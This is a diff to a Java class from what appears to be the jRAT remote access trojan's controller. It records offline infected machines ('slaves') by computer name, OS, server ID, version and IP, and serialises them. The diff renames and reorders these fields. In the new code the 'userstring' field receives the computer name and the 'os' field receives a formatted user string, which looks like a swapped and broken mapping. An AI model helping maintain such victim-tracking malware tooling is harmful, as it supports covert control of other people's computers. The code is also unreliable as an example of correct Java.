@@ -2,23 +2,23 @@ package se.jrat.client;
 
 public class OfflineSlave {
 
-	protected String computername;
-	protected String longosname;
+	protected String userstring;
+	protected String os;
 	protected String serverid;
 	protected String version;
 	protected String ip;
 	
 	public OfflineSlave(AbstractSlave slave) {
-		this.computername = slave.getComputerName();
-		this.longosname = slave.getLongOperatingSystem();
+		this.userstring = slave.getComputerName();
+		this.os = slave.formatUserString();
 		this.serverid = slave.getServerID();
 		this.version = slave.getVersion();
 		this.ip = slave.getRawIP();
 	}
 	
-	public OfflineSlave(String computername, String longosname, String serverid, String version, String ip) {
-		this.computername = computername;
-		this.longosname = longosname;
+	public OfflineSlave(String serverid, String userstring, String ip, String longosname, String version) {
+		this.userstring = userstring;
+		this.os = longosname;
 		this.serverid = serverid;
 		this.version = version;
 		this.ip = ip;
@@ -31,13 +31,18 @@ public class OfflineSlave {
 	
 	public static String toString(OfflineSlave slave) {
 		StringBuilder sb = new StringBuilder();
-		sb.append(slave.computername + ":");
-		sb.append(slave.longosname + ":");
 		sb.append(slave.serverid + ":");
-		sb.append(slave.version + ":");
+		sb.append(slave.userstring + ":");
+		sb.append(slave.os + ":");
 		sb.append(slave.ip + ":");
+		sb.append(slave.version + ":");
 		
 		return sb.toString();
+	}
+	
+	@Override
+	public String toString() {
+		return OfflineSlave.toString(this);
 	}
 
 }
